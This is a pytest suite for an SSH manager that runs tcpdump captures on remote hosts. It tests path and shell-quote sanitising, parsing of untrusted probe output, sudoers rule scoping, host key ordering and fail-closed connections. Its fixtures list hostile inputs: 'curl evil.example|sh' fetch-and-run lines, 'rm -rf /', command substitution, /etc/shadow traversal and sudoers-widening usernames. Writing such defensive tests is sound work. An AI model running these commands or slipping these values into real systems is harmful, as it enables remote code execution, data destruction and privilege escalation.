"""Tests for backend.ssh_manager's hostile-input surface: everything a
compromised or hostile remote host could answer with, and the injection
that must never reach a shell command."""

from __future__ import annotations

import asyncio
import re
from pathlib import Path

import pytest

from backend.ssh_manager import (
    SSHManager,
    _is_safe_tcpdump_path,
    _shell_quote,
    evaluate_prereqs,
    host_key_strength,
    parse_prereq_output,
    weaker_host_key_than_available,
)


# --- _is_safe_tcpdump_path ----------------------------------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "/bin/sh -c curl|sh",           # injection: space + pipe
        "/bin/sh; rm -rf /",            # injection: semicolon
        "/usr/bin/tcpdump`whoami`",     # injection: backtick substitution
        "/usr/bin/tcpdump$(whoami)",    # injection: $() substitution
        "/usr/bin/tcpdump && curl evil.example/x | sh",
        "/usr/bin/../../../etc/passwd",  # traversal -- and wrong basename
        "tcpdump",                       # relative path, no leading slash
        "bin/tcpdump",                   # relative path
        "/usr/bin/nc",                   # absolute, but not tcpdump
        "/usr/bin/tcpdump.exe",          # basename is not literally "tcpdump"
        "",                               # empty
        "/" + "a" * 260,                 # longer than the 255-char bound
        "/usr/bin/tcp\x00dump",          # embedded NUL
    ],
)
def test_is_safe_tcpdump_path_rejects_hostile_input(hostile):
    assert _is_safe_tcpdump_path(hostile) is False


@pytest.mark.parametrize(
    "safe",
    [
        "/usr/sbin/tcpdump",
        "/sbin/tcpdump",
        "/usr/local/bin/tcpdump",
        "/opt/some-vendor/tcpdump",
    ],
)
def test_is_safe_tcpdump_path_accepts_plausible_paths(safe):
    assert _is_safe_tcpdump_path(safe) is True


def test_is_safe_tcpdump_path_traversal_that_still_ends_in_tcpdump():
    """PurePosixPath does not collapse '..' segments, so a path containing
    them is judged purely on its final component -- this documents that
    behavior rather than assuming a stronger guarantee that isn't there:
    the value is only ever used as a literal string in a remote shell
    command, never resolved against a local filesystem, so this is not a
    local traversal primitive."""
    assert _is_safe_tcpdump_path("/usr/bin/../sbin/tcpdump") is True


# --- _shell_quote --------------------------------------------------------------


def test_shell_quote_empty_string():
    assert _shell_quote("") == "''"


@pytest.mark.parametrize("safe", ["tcpdump", "/usr/sbin/tcpdump", "eth0", "cap_2024-01-01.pcap"])
def test_shell_quote_passes_through_safe_strings_unchanged(safe):
    assert _shell_quote(safe) == safe


@pytest.mark.parametrize(
    "hostile",
    [
        "; rm -rf /",
        "$(whoami)",
        "`whoami`",
        "a b",
        "a|b",
        "a&b",
        "a'b",
        "a\"b",
    ],
)
def test_shell_quote_wraps_and_neutralizes_special_characters(hostile):
    quoted = _shell_quote(hostile)
    assert quoted.startswith("'") and quoted.endswith("'")
    # no unescaped single quote inside the body -- every embedded ' must be
    # the '"'"' escape sequence, never a bare one that would close early
    body = quoted[1:-1]
    assert "'\"'\"'" in body or "'" not in hostile


def test_shell_quote_embedded_single_quote_cannot_break_out():
    quoted = _shell_quote("'; rm -rf / #")
    # the quoting must never produce an unescaped closing quote followed by
    # more of the attacker's payload outside of quotes
    assert quoted == "''\"'\"'; rm -rf / #'"


# --- _key_path traversal --------------------------------------------------------


@pytest.fixture()
def manager(tmp_path):
    keys_dir = tmp_path / "ssh-keys"
    keys_dir.mkdir()
    return SSHManager(keys_dir, db=None, data_dir=tmp_path)


def test_key_path_resolves_normal_filename(manager, tmp_path):
    path = manager._key_path("my-key")
    assert path == (tmp_path / "ssh-keys" / "my-key")


@pytest.mark.parametrize(
    "hostile",
    [
        "../../../etc/passwd",
        "../../etc/shadow",
        "..",
        "subdir/../../escape",
    ],
)
def test_key_path_rejects_traversal(manager, hostile):
    with pytest.raises(ValueError):
        manager._key_path(hostile)


def test_key_path_rejects_absolute_path_escaping_keys_dir(manager):
    with pytest.raises(ValueError):
        manager._key_path("/etc/passwd")


# --- parse_prereq_output: hostile/untrusted probe output ------------------------


def test_parse_prereq_output_incomplete_probe():
    facts = parse_prereq_output("garbage, no markers at all")
    assert facts["complete"] is False


def test_parse_prereq_output_complete_probe_happy_path():
    raw = "\n".join([
        "OSREL_BEGIN",
        'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"',
        "ID=debian",
        "OSREL_END",
        "UID=1000",
        "USERGROUPS=alice sudo docker",
        "PATHVAL=/usr/local/bin:/usr/bin:/bin",
        "ONPATH=/usr/bin/tcpdump",
        "FOUND=/usr/bin/tcpdump",
        "SUDO=/usr/bin/sudo",
        "SUDO_NOPASSWD=yes",
        "VERSION=tcpdump version 4.99.0",
        "CAPS=cap_net_raw,cap_net_admin=eip",
        "SELINUX=Disabled",
        "TMPWRITE=yes",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["complete"] is True
    assert facts["os_release"]["PRETTY_NAME"] == "Debian GNU/Linux 12 (bookworm)"
    assert facts["uid"] == 1000
    assert facts["groups"] == ["alice", "sudo", "docker"]
    assert facts["on_path"] == "/usr/bin/tcpdump"
    assert facts["tcpdump_path"] == "/usr/bin/tcpdump"
    assert facts["sudo_present"] is True
    assert facts["sudo_nopasswd"] is True
    assert facts["tmp_writable"] is True


def test_parse_prereq_output_rejects_command_injection_in_found_path():
    raw = "\n".join([
        "UID=0",
        "FOUND=/bin/sh -c curl evil.example|sh",
        "ONPATH=/bin/sh -c curl evil.example|sh",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["found_paths"] == []
    assert facts["on_path"] == ""
    assert facts["tcpdump_path"] == ""


def test_parse_prereq_output_rejects_substitution_and_traversal_paths():
    raw = "\n".join([
        "FOUND=/usr/bin/tcpdump`whoami`",
        "FOUND=/usr/bin/tcpdump$(id)",
        "FOUND=/usr/bin/../../etc/passwd",
        "FOUND=relative/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["found_paths"] == []


def test_parse_prereq_output_dedupes_found_paths():
    raw = "\n".join([
        "FOUND=/usr/sbin/tcpdump",
        "FOUND=/usr/sbin/tcpdump",
        "FOUND=/usr/bin/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["found_paths"] == ["/usr/sbin/tcpdump", "/usr/bin/tcpdump"]


def test_parse_prereq_output_strips_nonprintable_characters():
    raw = "\n".join([
        "UID=1000",
        "USERGROUPS=alice\x00 sudo\x1b[31m",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    for group in facts["groups"]:
        assert group.isprintable() or group == ""
        assert "\x00" not in group


def test_parse_prereq_output_bounds_absurdly_long_values():
    raw = "\n".join([
        "PATHVAL=" + "A" * 10_000,
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert len(facts["path_env"]) <= 400


def test_parse_prereq_output_bounds_group_list_length():
    raw = "\n".join([
        "USERGROUPS=" + " ".join(f"g{i}" for i in range(1000)),
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert len(facts["groups"]) <= 40


def test_parse_prereq_output_uid_must_be_digits():
    raw = "\n".join(["UID=not-a-number", "PROBE_COMPLETE"])
    facts = parse_prereq_output(raw)
    assert facts["uid"] is None


def test_parse_prereq_output_sudo_nopasswd_requires_exact_yes():
    for value in ("YES", "true", "1", "yes please", ""):
        raw = f"SUDO_NOPASSWD={value}\nPROBE_COMPLETE"
        assert parse_prereq_output(raw)["sudo_nopasswd"] is False
    assert parse_prereq_output("SUDO_NOPASSWD=yes\nPROBE_COMPLETE")["sudo_nopasswd"] is True


def test_parse_prereq_output_os_release_values_are_bounded_and_cleaned():
    raw = "\n".join([
        "OSREL_BEGIN",
        "PRETTY_NAME=" + "x" * 1000,
        "OSREL_END",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert len(facts["os_release"]["PRETTY_NAME"]) <= 80


def test_parse_prereq_output_tcpdump_path_prefers_on_path_over_found():
    raw = "\n".join([
        "ONPATH=/usr/bin/tcpdump",
        "FOUND=/usr/sbin/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["tcpdump_path"] == "/usr/bin/tcpdump"


def test_parse_prereq_output_tcpdump_path_falls_back_to_found():
    raw = "\n".join([
        "FOUND=/usr/sbin/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["tcpdump_path"] == "/usr/sbin/tcpdump"


# --- evaluate_prereqs: privilege matrix -----------------------------------------


def make_facts(**overrides) -> dict:
    facts = {
        "complete": True,
        "os_release": {"PRETTY_NAME": "Test Linux"},
        "found_paths": ["/usr/sbin/tcpdump"],
        "uid": 1000,
        "groups": [],
        "on_path": "/usr/sbin/tcpdump",
        "tcpdump_path": "/usr/sbin/tcpdump",
        "version": "tcpdump version 4.99.0",
        "caps": "",
        "caps_unavailable": False,
        "sudo_present": False,
        "sudo_nopasswd": False,
        "selinux": "",
        "tmp_writable": True,
        "path_env": "/usr/bin:/bin",
    }
    facts.update(overrides)
    return facts


def _check(checks: list[dict], name: str) -> dict:
    for c in checks:
        if c["name"] == name:
            return c
    raise AssertionError(f"no check named {name!r} in {[c['name'] for c in checks]}")


def test_evaluate_prereqs_incomplete_probe_short_circuits():
    checks = evaluate_prereqs(make_facts(complete=False), use_sudo=False)
    assert len(checks) == 1
    assert checks[0]["status"] == "fail"


def test_evaluate_prereqs_no_tcpdump_short_circuits():
    checks = evaluate_prereqs(make_facts(tcpdump_path="", on_path=""), use_sudo=False)
    assert _check(checks, "tcpdump installed")["status"] == "fail"
    assert not any(c["name"] == "Capture privilege" for c in checks)


def test_evaluate_prereqs_root_is_ok_regardless_of_sudo():
    checks = evaluate_prereqs(make_facts(uid=0), use_sudo=False)
    assert _check(checks, "Capture privilege")["status"] == "ok"


def test_evaluate_prereqs_cap_net_raw_is_ok_without_sudo():
    checks = evaluate_prereqs(
        make_facts(uid=1000, caps="cap_net_raw,cap_net_admin=eip"), use_sudo=False
    )
    assert _check(checks, "Capture privilege")["status"] == "ok"


def test_evaluate_prereqs_sudo_nopasswd_is_ok():
    checks = evaluate_prereqs(
        make_facts(uid=1000, sudo_present=True, sudo_nopasswd=True), use_sudo=True
    )
    assert _check(checks, "Capture privilege")["status"] == "ok"


def test_evaluate_prereqs_sudo_demands_password_fails():
    checks = evaluate_prereqs(
        make_facts(uid=1000, sudo_present=True, sudo_nopasswd=False, groups=["sudo"]),
        use_sudo=True,
    )
    check = _check(checks, "Capture privilege")
    assert check["status"] == "fail"
    assert "demanding a password" in check["detail"]
    assert "sudo" in check["detail"]


def test_evaluate_prereqs_sudo_requested_but_not_installed_fails():
    checks = evaluate_prereqs(
        make_facts(uid=1000, sudo_present=False), use_sudo=True
    )
    check = _check(checks, "Capture privilege")
    assert check["status"] == "fail"
    assert "not installed" in check["detail"]


def test_evaluate_prereqs_no_privilege_path_at_all_fails():
    checks = evaluate_prereqs(
        make_facts(uid=1000, caps="", sudo_present=False), use_sudo=False
    )
    check = _check(checks, "Capture privilege")
    assert check["status"] == "fail"
    assert "setcap" in check["fix"]


def test_evaluate_prereqs_caps_unavailable_warns_when_relevant():
    checks = evaluate_prereqs(
        make_facts(uid=1000, caps="", caps_unavailable=True, sudo_present=False), use_sudo=False
    )
    assert _check(checks, "Capability check")["status"] == "warn"


def test_evaluate_prereqs_caps_unavailable_not_shown_for_root():
    checks = evaluate_prereqs(
        make_facts(uid=0, caps_unavailable=True), use_sudo=False
    )
    assert not any(c["name"] == "Capability check" for c in checks)


def test_evaluate_prereqs_tmp_not_writable_fails():
    checks = evaluate_prereqs(make_facts(tmp_writable=False), use_sudo=False)
    assert _check(checks, "Temp space writable")["status"] == "fail"


def test_evaluate_prereqs_tmp_writable_unknown_produces_no_check():
    checks = evaluate_prereqs(make_facts(tmp_writable=None), use_sudo=False)
    assert not any(c["name"] == "Temp space writable" for c in checks)


@pytest.mark.parametrize("state,status", [("enforcing", "warn"), ("permissive", "ok"), ("disabled", "ok")])
def test_evaluate_prereqs_selinux_states(state, status):
    checks = evaluate_prereqs(make_facts(selinux=state), use_sudo=False)
    assert _check(checks, "SELinux")["status"] == status


def test_evaluate_prereqs_selinux_absent_produces_no_check():
    checks = evaluate_prereqs(make_facts(selinux=""), use_sudo=False)
    assert not any(c["name"] == "SELinux" for c in checks)


def test_evaluate_prereqs_on_path_warns_when_only_absolute():
    checks = evaluate_prereqs(make_facts(on_path=""), use_sudo=False)
    assert _check(checks, "tcpdump on the SSH PATH")["status"] == "warn"


# --- the sudoers rule the operator is told to paste as root ------------------
#
# This text is instructions for a root shell. It must grant exactly one binary
# and must install through visudo, which validates before replacing the file --
# a broken file in /etc/sudoers.d/ breaks sudo for everyone on the host.


def _privilege_fix(**overrides) -> str:
    facts = make_facts(sudo_present=True, sudo_nopasswd=False, **overrides)
    checks = evaluate_prereqs(facts, use_sudo=True, username="pcapuser")
    return _check(checks, "Capture privilege")["fix"]


def _granted_rules(fix: str) -> list[str]:
    """The sudoers rules inside the remedy's quoted echo arguments.

    Prose is deliberately excluded: the remedy *names* `NOPASSWD: ALL` to warn
    against it, so searching the whole blob for that string proves nothing.
    What matters is what the rules actually grant.
    """
    return re.findall(r"echo '([^']*NOPASSWD:[^']*)'", fix)


def test_sudoers_remedy_scopes_every_granted_rule_to_tcpdump_alone():
    fix = _privilege_fix()
    rules = _granted_rules(fix)
    assert rules, f"no sudoers rule found in remedy: {fix!r}"
    for rule in rules:
        assert rule.endswith("/usr/sbin/tcpdump"), f"rule grants more than tcpdump: {rule!r}"
        assert not rule.rstrip().endswith("NOPASSWD: ALL")


def test_sudoers_remedy_installs_through_visudo_not_tee():
    """visudo validates and refuses to install a malformed file; a bare
    `tee` into /etc/sudoers.d/ leaves the host with sudo broken for everyone."""
    fix = _privilege_fix()
    assert "visudo -f /etc/sudoers.d/pcap-server" in fix
    assert "| sudo tee /etc/sudoers.d" not in fix


def test_sudoers_remedy_names_the_real_user_not_a_group_that_does_not_exist():
    assert "pcapuser ALL=" in _privilege_fix()
    assert "%pcap" not in _privilege_fix()


def test_sudoers_remedy_without_a_username_creates_the_group_it_references():
    """The group form is only correct if the group is made first -- otherwise
    the rule silently matches nobody and captures keep failing."""
    checks = evaluate_prereqs(
        make_facts(sudo_present=True, sudo_nopasswd=False), use_sudo=True
    )
    fix = _check(checks, "Capture privilege")["fix"]
    assert "%pcap ALL=(root) NOPASSWD: /usr/sbin/tcpdump" in fix
    assert "groupadd -f pcap" in fix


def test_no_privilege_path_remedy_is_also_scoped_and_uses_visudo():
    checks = evaluate_prereqs(make_facts(), use_sudo=False, username="pcapuser")
    fix = _check(checks, "Capture privilege")["fix"]
    assert "setcap cap_net_raw" in fix
    assert "| sudo tee /etc/sudoers.d" not in fix
    for rule in _granted_rules(fix):
        assert rule.endswith("/usr/sbin/tcpdump")


# --- username validation ------------------------------------------------------
#
# The username is interpolated into the sudoers rule above -- text the operator
# is told to run as root. A username carrying sudoers syntax could widen that
# rule into a blanket grant, so the characters sudoers reads are rejected at
# the model boundary rather than escaped at each use.


@pytest.mark.parametrize(
    "hostile",
    [
        "x ALL=(ALL) NOPASSWD: ALL #",   # comments out the tcpdump scope
        "x ALL=(ALL) NOPASSWD: ALL",
        "root, x",                        # a second user in the same rule
        "x!authenticate",
        "x\nroot ALL=(ALL) NOPASSWD: ALL",
        "x ALL=(root) NOPASSWD: /bin/sh",
        "a b",
        "-flag",
        "",
        "   ",
    ],
)
def test_server_auth_rejects_usernames_carrying_sudoers_syntax(hostile):
    from pydantic import ValidationError

    from backend.models import ServerAuth

    with pytest.raises(ValidationError):
        ServerAuth(hostname="example.com", username=hostile, ssh_key_name="k")


@pytest.mark.parametrize(
    "name", ["root", "pcapuser", "first.last", "svc_pcap", "net-admin", "user@REALM", "u1"]
)
def test_server_auth_accepts_real_login_names(name):
    from backend.models import ServerAuth

    assert ServerAuth(hostname="example.com", username=name, ssh_key_name="k").username == name


def test_a_rejected_username_can_never_reach_the_sudoers_rule():
    """The end-to-end statement: there is no ServerAuth whose username widens
    the printed grant, because the model refuses to construct one."""
    from pydantic import ValidationError

    from backend.models import ServerAuth

    with pytest.raises(ValidationError):
        ServerAuth(
            hostname="example.com",
            username="x ALL=(ALL) NOPASSWD: ALL #",
            ssh_key_name="k",
        )


# --- host key algorithm strength ----------------------------------------------
#
# Which algorithm a handshake settles on is invisible otherwise, and a host that
# still carries an ssh-rsa key will use it happily. Surfacing a weaker-than-
# available choice is a warning only: the connection is verified either way.


def test_ed25519_outranks_every_other_host_key():
    for weaker in ["ssh-dss", "ssh-rsa", "ecdsa-sha2-nistp521", "rsa-sha2-512"]:
        assert host_key_strength("ssh-ed25519") > host_key_strength(weaker)


def test_ssh_rsa_outranks_only_dss():
    """ssh-rsa signs with SHA-1 whatever the key size, and OpenSSH 8.8 turned it
    off by default -- it sits above ssh-dss and below everything else."""
    assert host_key_strength("ssh-rsa") > host_key_strength("ssh-dss")
    for stronger in ["ecdsa-sha2-nistp256", "rsa-sha2-256", "ssh-ed25519"]:
        assert host_key_strength("ssh-rsa") < host_key_strength(stronger)


def test_unknown_algorithm_sorts_below_everything_known():
    """An algorithm this list has never heard of must not be treated as the
    strongest on offer and silence the warning."""
    assert host_key_strength("nonsense-algo") == -1
    assert host_key_strength("nonsense-algo") < host_key_strength("ssh-dss")


def test_warns_when_a_stronger_key_was_on_offer():
    assert weaker_host_key_than_available("ssh-rsa", ["ssh-rsa", "ssh-ed25519"]) == "ssh-ed25519"


def test_no_warning_when_the_strongest_was_negotiated():
    assert weaker_host_key_than_available("ssh-ed25519", ["ssh-rsa", "ssh-ed25519"]) == ""


def test_no_warning_when_the_host_offers_only_one_algorithm():
    assert weaker_host_key_than_available("ssh-rsa", ["ssh-rsa"]) == ""


def test_names_the_strongest_alternative_not_merely_a_better_one():
    stronger = weaker_host_key_than_available(
        "ssh-rsa", ["ssh-rsa", "ecdsa-sha2-nistp256", "ssh-ed25519"]
    )
    assert stronger == "ssh-ed25519"


@pytest.mark.parametrize("negotiated,available", [("", ["ssh-ed25519"]), ("ssh-rsa", [])])
def test_no_warning_without_both_halves_of_the_comparison(negotiated, available):
    """asyncssh may not report the algorithm, and a host may have no stored
    keys. Neither is a reason to invent a warning."""
    assert weaker_host_key_than_available(negotiated, available) == ""


# --- getcap discovery and its install hint ------------------------------------


def test_probe_searches_sbin_for_getcap_not_just_the_path():
    """getcap is installed into /sbin on Debian and Ubuntu, which a non-login
    SSH session for a non-root user does not have on PATH -- the same reason
    tcpdump already needed a fallback search. Trusting `command -v getcap`
    alone reported "getcap is not installed" on hosts that had it."""
    from backend.ssh_manager import _PREREQ_SCRIPT

    assert "/sbin/getcap" in _PREREQ_SCRIPT
    assert "/usr/sbin/getcap" in _PREREQ_SCRIPT


@pytest.mark.parametrize(
    "os_id,expected_package",
    [
        ("debian", "libcap2-bin"),
        ("ubuntu", "libcap2-bin"),
        ("fedora", "libcap"),
        ("rocky", "libcap"),
        ("opensuse", "libcap-progs"),
        ("alpine", "libcap"),
        ("arch", "libcap"),
    ],
)
def test_getcap_install_hint_names_the_right_package_per_family(os_id, expected_package):
    from backend.ssh_manager import getcap_install_hint

    assert expected_package in getcap_install_hint({"ID": os_id})


def test_getcap_hint_is_empty_where_file_capabilities_do_not_exist():
    """FreeBSD has no Linux file capabilities, so there is nothing to suggest
    installing -- an install command there would just be wrong."""
    from backend.ssh_manager import getcap_install_hint

    assert getcap_install_hint({"ID": "freebsd"}) == ""


def test_getcap_hint_falls_back_for_an_unrecognised_distro():
    from backend.ssh_manager import getcap_install_hint

    assert "getcap" in getcap_install_hint({"ID": "some-unknown-linux"})


def test_install_hint_still_defaults_to_tcpdump():
    from backend.ssh_manager import install_hint

    assert install_hint({"ID": "debian"}) == "sudo apt-get install tcpdump"


def test_capability_check_offers_a_way_to_install_getcap():
    checks = evaluate_prereqs(
        make_facts(caps="", caps_unavailable=True, os_release={"ID": "debian"}),
        use_sudo=False, username="pcapuser",
    )
    check = _check(checks, "Capability check")
    assert check["status"] == "warn"
    assert "libcap2-bin" in check["fix"]


# --- known_hosts file ordering ------------------------------------------------
#
# The order of this file is not cosmetic. asyncssh derives its list of
# acceptable server host key algorithms by walking the matched entries in file
# order, and SSH settles on the first algorithm the server also holds -- so the
# first line decides what the handshake uses.
#
# The rows come out of SQLite in insertion order, which is whatever order
# ssh-keyscan printed them in, and ssh-keyscan asks for rsa before ed25519. A
# host carrying both was negotiating RSA because of the order it had been
# scanned in, and forgetting and rescanning a host could change which key it
# used with nothing said.


class StubKnownHostsDB:
    """Hands back rows in the order given, the way SQLite hands back rowids."""

    def __init__(self, key_types: list[str]) -> None:
        self._rows = [
            {"key_type": kt, "host_key": f"AAAA{kt}", "hostname": "h", "port": 22}
            for kt in key_types
        ]

    def get_known_hosts(self, hostname: str, port: int) -> list[dict]:
        return list(self._rows)


def _known_hosts_algorithms(manager, key_types, port=22):
    manager._db = StubKnownHostsDB(key_types)
    path = asyncio.run(manager._get_known_hosts_file("target.example", port))
    try:
        return [line.split()[1] for line in Path(path).read_text().splitlines() if line.strip()]
    finally:
        Path(path).unlink(missing_ok=True)


def test_known_hosts_puts_the_strongest_key_first(manager):
    """ssh-keyscan's own order, which is what was being written verbatim."""
    algs = _known_hosts_algorithms(manager, ["ssh-rsa", "ecdsa-sha2-nistp256", "ssh-ed25519"])
    assert algs[0] == "ssh-ed25519"
    assert algs == ["ssh-ed25519", "ecdsa-sha2-nistp256", "ssh-rsa"]


def test_known_hosts_order_does_not_depend_on_scan_order(manager):
    """The regression itself: a forget-and-rescan reshuffles the rows, and that
    must not change which key the handshake settles on."""
    scanned_one_way = _known_hosts_algorithms(manager, ["ssh-rsa", "ssh-ed25519"])
    scanned_the_other = _known_hosts_algorithms(manager, ["ssh-ed25519", "ssh-rsa"])
    assert scanned_one_way == scanned_the_other == ["ssh-ed25519", "ssh-rsa"]


def test_known_hosts_keeps_every_key_it_was_given(manager):
    """Preferring the strongest is not the same as discarding the others: the
    host may rotate, and a key that is not in the file will not verify."""
    algs = _known_hosts_algorithms(manager, ["ssh-rsa", "ssh-dss", "ssh-ed25519"])
    assert sorted(algs) == sorted(["ssh-rsa", "ssh-dss", "ssh-ed25519"])


def test_known_hosts_sorts_an_unrecognised_algorithm_last(manager):
    """An algorithm the rank has never heard of must not be preferred over
    ed25519 just because it was scanned first."""
    algs = _known_hosts_algorithms(manager, ["nonsense-algo", "ssh-ed25519"])
    assert algs[0] == "ssh-ed25519"


def test_known_hosts_brackets_a_non_default_port(manager):
    """Ordering must not disturb the [host]:port form a non-22 endpoint needs."""
    manager._db = StubKnownHostsDB(["ssh-rsa", "ssh-ed25519"])
    path = asyncio.run(manager._get_known_hosts_file("target.example", 2222))
    try:
        lines = Path(path).read_text().splitlines()
    finally:
        Path(path).unlink(missing_ok=True)
    assert lines[0].startswith("[target.example]:2222 ssh-ed25519 ")


def test_known_hosts_file_is_absent_when_nothing_is_trusted(manager):
    """The state that disables verification entirely -- unchanged here, but it
    is the branch the ordering must not accidentally take over."""
    manager._db = StubKnownHostsDB([])
    assert asyncio.run(manager._get_known_hosts_file("target.example", 22)) is None


# --- connections fail closed --------------------------------------------------
#
# asyncssh reads known_hosts=None as "skip host key validation", not as "fall
# back to ~/.ssh/known_hosts". So a host with nothing stored used to connect
# with nothing checked, offering the SSH key to whatever answered on that
# address. There is no chicken and egg in refusing: trusting a host goes
# through ssh-keyscan in scan_host_keys(), which never reaches _connect().


def _plaintext_key(manager) -> None:
    import asyncssh as _asyncssh
    key = _asyncssh.generate_private_key("ssh-ed25519")
    (manager._keys_dir / "k").write_bytes(key.export_private_key())


def _server(**kw):
    from backend.models import ServerAuth
    return ServerAuth(hostname="target.example", username="alice", ssh_key_name="k", **kw)


def test_connect_refuses_a_host_with_no_trusted_keys(manager, monkeypatch):
    import asyncssh as _asyncssh
    _plaintext_key(manager)
    manager._db = StubKnownHostsDB([])

    reached = False

    async def must_not_be_called(*args, **kwargs):
        nonlocal reached
        reached = True

    monkeypatch.setattr(_asyncssh, "connect", must_not_be_called)

    with pytest.raises(ConnectionError) as exc:
        asyncio.run(manager._connect(_server()))

    assert not reached, "an untrusted host must be refused before a socket is opened"
    assert "no trusted host keys" in str(exc.value)
    assert "target.example:22" in str(exc.value)


def test_refusal_names_where_to_trust_the_host(manager):
    """The message is the only thing standing between the operator and a
    connection that simply does not work."""
    _plaintext_key(manager)
    manager._db = StubKnownHostsDB([])

    with pytest.raises(ConnectionError) as exc:
        asyncio.run(manager._connect(_server()))

    assert "Known Hosts" in str(exc.value)


def test_a_mismatched_host_key_is_not_reported_as_a_setup_step(manager, monkeypatch):
    """HostKeyNotVerifiable can only fire when keys ARE stored and the host
    answered with something else -- the no-keys case is refused earlier. The
    message used to say "scan the host key first", describing the one
    situation it can never be raised for, and reading like a setup step
    rather than the alarm it is."""
    import asyncssh as _asyncssh
    _plaintext_key(manager)
    manager._db = StubKnownHostsDB(["ssh-ed25519"])

    async def mismatched(*args, **kwargs):
        raise _asyncssh.HostKeyNotVerifiable("nope")

    monkeypatch.setattr(_asyncssh, "connect", mismatched)

    with pytest.raises(ConnectionError) as exc:
        asyncio.run(manager._connect(_server()))

    message = str(exc.value)
    assert "does not match" in message
    assert "scan the host key first" not in message.lower()


# --- reading a capture while it is still being written ------------------------
#
# RemoteCapture.read_at is what a live stream is built on, and it is the one
# part of live streaming that a fake cannot prove: the offset semantics, the
# behaviour of a read that runs past the end of a file, and whether an open
# handle sees bytes appended after it was opened are all asyncssh's answers,
# not ours. So these run against a real SSH server with a real SFTP subsystem,
# in-process, over loopback.
#
# Getting any of it wrong breaks live streaming completely and silently: a
# read_at that ignored its offset would re-send the whole capture on every poll
# and desynchronise the record walk with no error anywhere.


@pytest.fixture()
async def sftp_capture(tmp_path):
    """A RemoteCapture bound to a real asyncssh connection serving tmp_path.

    The keys are generated per test and exist only in memory and this
    directory; nothing here is a credential to anything.
    """
    import asyncssh

    from backend.ssh_manager import RemoteCapture

    host_key = asyncssh.generate_private_key("ssh-ed25519")
    client_key = asyncssh.generate_private_key("ssh-ed25519")
    authorized = asyncssh.import_authorized_keys(
        client_key.export_public_key().decode() + "\n"
    )

    server = await asyncssh.create_server(
        lambda: asyncssh.SSHServer(),
        "127.0.0.1", 0,
        server_host_keys=[host_key],
        authorized_client_keys=authorized,
        sftp_factory=True,
    )
    port = next(iter(server.sockets)).getsockname()[1]

    conn = await asyncssh.connect(
        "127.0.0.1", port,
        username="tester",
        client_keys=[client_key],
        # The server's own key, trusted explicitly. Not disabled host-key
        # checking: this repo pins host keys deliberately, and a test fixture
        # that turns the check off is one more place the habit can leak from.
        known_hosts=([host_key.convert_to_public()], [], []),
    )

    class DummyProcess:
        def close(self):
            pass

    capture = RemoteCapture(DummyProcess(), conn)
    try:
        yield capture, tmp_path
    finally:
        await capture.close()
        server.close()
        await server.wait_closed()


async def test_read_at_returns_the_slice_it_was_asked_for(sftp_capture):
    capture, root = sftp_capture
    path = root / "capture.pcap"
    path.write_bytes(bytes(range(256)))

    assert await capture.read_at(str(path), 0, 16) == bytes(range(16))
    assert await capture.read_at(str(path), 100, 8) == bytes(range(100, 108))


async def test_read_at_sees_bytes_appended_after_the_last_read(sftp_capture):
    """The whole premise of live streaming: the file grows under the reader.

    A poll reads to the end, finds nothing more, and comes back later for what
    tcpdump has written since.
    """
    capture, root = sftp_capture
    path = root / "capture.pcap"
    path.write_bytes(b"first")

    assert await capture.read_at(str(path), 0, 4096) == b"first"

    with open(path, "ab") as fh:
        fh.write(b"-second")

    assert await capture.read_at(str(path), 5, 4096) == b"-second"


async def test_reading_past_the_end_gives_back_nothing_rather_than_failing(sftp_capture):
    """Every poll of a quiet link does exactly this. It is the normal case, and
    it has to be distinguishable from an error -- live_poll reads an empty
    result as "caught up" and stops."""
    capture, root = sftp_capture
    path = root / "capture.pcap"
    path.write_bytes(b"abcdef")

    assert await capture.read_at(str(path), 6, 4096) == b""
    assert await capture.read_at(str(path), 999, 4096) == b""


async def test_a_short_read_is_how_catching_up_is_detected(sftp_capture):
    """live_poll stops its loop when it gets back less than it asked for."""
    capture, root = sftp_capture
    path = root / "capture.pcap"
    path.write_bytes(b"x" * 100)

    data = await capture.read_at(str(path), 0, 4096)
    assert len(data) == 100 < 4096


async def test_read_at_refuses_once_the_capture_is_closed(sftp_capture):
    """A live poll racing the end of a capture must fail rather than hang on a
    connection that is going away."""
    capture, root = sftp_capture
    path = root / "capture.pcap"
    path.write_bytes(b"data")

    await capture.close()
    with pytest.raises(ConnectionResetError):
        await capture.read_at(str(path), 0, 16)


async def test_closing_twice_is_still_safe_with_an_sftp_client_open(sftp_capture):
    """close() is called from the monitor, from delete and at shutdown. Opening
    an SFTP client during the capture must not make it single-use."""
    capture, root = sftp_capture
    path = root / "capture.pcap"
    path.write_bytes(b"data")
    await capture.read_at(str(path), 0, 4)

    await capture.close()
    await capture.close()
